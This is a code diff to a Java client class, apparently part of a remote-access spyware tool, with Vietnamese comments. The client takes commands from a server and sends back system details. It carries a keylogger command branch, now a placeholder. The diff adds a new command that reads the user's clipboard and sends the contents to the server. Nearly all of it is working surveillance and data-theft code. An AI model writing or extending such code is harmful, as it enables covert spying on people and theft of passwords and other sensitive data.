@@ -22,23 +22,26 @@ public class User {
 
             // Đối tượng để lấy thông tin hệ thống
             SystemInformation systeminfo = new SystemInformation();
+            ClipboardReader clipboardReader = new ClipboardReader(); // Đối tượng để đọc clipboard
 
             String serverCommand;
             while ((serverCommand = in.readLine()) != null) {
                 System.out.println("Command from server: " + serverCommand);
                 if ("information".equals(serverCommand)) {         
                     StringBuilder info = new StringBuilder(); 
-                        info.append("CPU Info: ").append(systeminfo.getCpuInfo()).append("\n");
-                        info.append("Memory Info: ").append(systeminfo.getMemoryInfo()).append("\n");
-                        info.append("Disk Info: ").append(systeminfo.getDiskInfo()).append("\n");
-                        info.append("Network Info: ").append(systeminfo.getNetworkInfo()).append("\n"); 
+                    info.append("CPU Info: ").append(systeminfo.getCpuInfo()).append("\n");
+                    info.append("Memory Info: ").append(systeminfo.getMemoryInfo()).append("\n");
+                    info.append("Disk Info: ").append(systeminfo.getDiskInfo()).append("\n");
+                    info.append("Network Info: ").append(systeminfo.getNetworkInfo()).append("\n"); 
                     String[] infoLines = info.toString().split("\n");
                     for (String line : infoLines) {
                         out.println("INFO:" + line);
                     }                 
-                  } else if ("keylogger".equals(serverCommand)) {
-                    // KeyLogger sẽ tự động gửi sự kiện phím qua PrintWriter
-                    // Không cần xử lý gì thêm ở đây
+                } else if ("keylogger".equals(serverCommand)) {
+                    // Placeholder for keylogger functionality
+                } else if ("clipboard".equals(serverCommand)) {
+                    String clipboardData = clipboardReader.readClipboard();
+                    out.println("CLIPBOARD:" + clipboardData);
                 }
             }
         } catch (IOException e) {
